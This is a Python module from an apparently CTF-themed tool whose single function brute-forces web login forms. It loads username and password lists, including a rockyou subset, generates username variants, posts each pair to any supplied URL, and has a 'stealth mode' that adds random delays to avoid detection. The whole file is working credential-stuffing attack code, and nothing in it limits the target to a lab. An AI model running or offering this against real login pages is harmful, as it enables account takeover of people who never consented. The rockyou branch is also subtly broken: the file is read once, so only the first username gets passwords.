import requests
import colorama
from colorama import Fore, Style
import random
import time
import os
from datetime import datetime

def log_action(message):
    """Log actions/errors to ctf_log.txt"""
    try:
        with open("data/ctf_log.txt", "a") as f:
            f.write(f"{datetime.now()}: {message}\n")
    except Exception as e:
        print(f"{Fore.RED}[-] Error logging: {e}{Style.RESET_ALL}")

def run_brute_force(url, username_field, password_field, username_file, mode, stealth_mode, colors):
    """Brute-force web logins like a red team pro"""
    try:
        result = []
        headers = {'User-Agent': 'CTFBlitz/1.0'}
        # Load usernames
        if not os.path.exists(username_file):
            log_action(f"Username file not found: {username_file}")
            return f"{colors['error']}[-] Username file {username_file} not found! Download from seclists.{Style.RESET_ALL}"
        with open(username_file) as f:
            usernames = f.read().splitlines()
            if not usernames:
                log_action(f"Username file empty: {username_file}")
                return f"{colors['error']}[-] Username file is empty!{Style.RESET_ALL}"
        # Generate username variants
        base_user = usernames[0] if usernames else "admin"
        username_variants = [base_user, base_user+"1", base_user+"_", base_user+"123", base_user+"admin"]
        usernames = list(set(username_variants + usernames[:10])) if mode == "Normal" else usernames[:1000]
        # Load passwords
        if mode == "Normal":
            if not os.path.exists("data/ctf_creds.txt"):
                log_action("data/ctf_creds.txt not found")
                return f"{colors['error']}[-] data/ctf_creds.txt not found!{Style.RESET_ALL}"
            with open("data/ctf_creds.txt") as f:
                creds = [line.strip().split(":") for line in f if ":" in line]
        else:
            if not os.path.exists("data/rockyou_small.txt"):
                log_action("data/rockyou_small.txt not found")
                return f"{colors['error']}[-] data/rockyou_small.txt not found! Create from rockyou.txt (first 10,000 lines).{Style.RESET_ALL}"
            with open("data/rockyou_small.txt") as f:
                creds = [(u, p) for u in usernames for p in f.read().splitlines()[:10000]]
        print(f"{colors['success']}[+] Brute-forcing {url}... Time to crack some logins!{Style.RESET_ALL}")
        log_action(f"Starting brute-force on {url}")
        for i, (username, password) in enumerate(creds[:50 if mode == "Normal" else 10000]):
            if stealth_mode and i % 100 == 0 and i > 0:
                time.sleep(random.uniform(0.5, 2))
            try:
                r = requests.post(url, data={username_field: username, password_field: password}, headers=headers, timeout=5)
                if "login failed" not in r.text.lower():
                    result.append(f"Pwned! Success: {username}:{password}")
                    log_action(f"Brute-force success: {username}:{password}")
                    return "\n".join(result)
            except:
                continue
        log_action(f"Brute-force completed on {url}")
        return "\n".join(result) or f"{colors['error']}[-] No credentials found! Try another login page!{Style.RESET_ALL}"
    except Exception as e:
        log_action(f"Brute-force error: {e}")
        return f"{colors['error']}[-] Brute-force error: {e}{Style.RESET_ALL}"